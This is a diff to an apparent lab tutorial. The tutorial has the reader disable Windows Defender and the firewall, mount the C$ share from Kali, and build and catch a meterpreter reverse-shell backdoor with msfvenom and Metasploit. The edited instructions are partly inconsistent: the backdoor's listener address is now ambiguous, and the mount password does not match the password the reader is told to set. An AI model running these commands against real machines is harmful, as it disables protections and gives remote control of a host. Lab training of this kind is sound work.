@@ -18,7 +18,28 @@ This will disable **Defender** for this session.
 
 If you get angry red errors, that is **Ok**, it means **Defender** is not running.
 
-Let’s get started by opening a **Kali** instance.
+Next, lets ensure the firewall is disabled. In a Windows Command Prompt.
+
+<pre> netsh advfirewall set allprofiles state off</pre>
+
+
+Next, set a password for the Administrator account that you can remember
+
+<pre>net user Administrator password1234</pre>
+
+Please note, that is a very bad password.  Come up with something better. But, please remember it.
+
+Before we move on from our Powershell window, lets get our IP by running the following command:
+
+<pre>ipconfig</pre>
+
+![](attachments/powershellipconfig.png)
+
+**REMEMBER - YOUR IP WILL BE DIFFERENT**
+
+Write this IP down so we can use it again later.
+
+Let’s continue by opening a **Kali** instance.
 
 ![](attachments/OpeningKaliInstance.png)
 
@@ -30,37 +51,9 @@ Let's start by getting root access in our terminal.
 
 <pre>sudo su -</pre>
 
-Next, lets run the following command to get our IP address:
-
-<pre>ifconfig</pre>
-
-**Please note the IP address of Y-O-U-R Ethernet adapter.**
-
-![](attachments/applocker_ifconfig.png)
-
-Please note that my adapter is called **"eth0"** and my IP address is **"10.10.1.117"**
-
-**REMEMBER - YOUR IP ADDRESS WILL LIKELY BE DIFFERENT.**
-
-Next, lets ensure the firewall is disabled. In a Windows Command Prompt.
-
-<pre> netsh advfirewall set allprofiles state off</pre>
-
-Next, set a password for the Administrator account that you can remember
-
-<pre>net user Administrator password1234</pre>
-
-Please note, that is a very bad password.  Come up with something better. But, please remember it.
-
-Within the Command Prompt, please run the following command:
-
-<pre>ipconfig</pre>
-
-Please note your Windows IP address.
-
 We need to run the following command in order to mount our remote system to the correct directory:
 
-<pre>mount -t cifs //10.10.1.209/c$ /mnt/windows-share -o username=Administrator,password=T@GEq5%r2XJh</pre>
+<pre>mount -t cifs //[Your IP Address]/c$ /mnt/windows-share -o username=Administrator,password=T@GEq5%r2XJh</pre>
 
 **REMEMBER - YOUR IP ADDRESS WILL LIKELY BE DIFFERENT.**
 
@@ -74,7 +67,7 @@ If this is the case, just run the following command to navigate into the mounted
 
 Run the following commands to start a simple backdoor and backdoor listener: 
 
-<pre>msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=[YOUR LINUX IP] lport=4444 -f exe -o /mnt/windows-share/TrustMe.exe</pre>
+<pre>msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=[YOUR IP Address] lport=4444 -f exe -o /mnt/windows-share/TrustMe.exe</pre>
 
 Let's start the **Metasploit Handler**.  First, open a new **Kali** instance. The easiest way to do this is by clicking on the **Kali** icon in the taskbar.
 
@@ -96,7 +89,7 @@ Now run all of the following commands to set the correct parameters:
 
 <pre>set PAYLOAD windows/meterpreter/reverse_tcp</pre>
 
-<pre>set LHOST 10.10.1.117</pre>
+<pre>set LHOST 10.10.81.56</pre>
 
 **REMEMBER - YOUR IP WILL LIKELY BE DIFFERENT!**
 
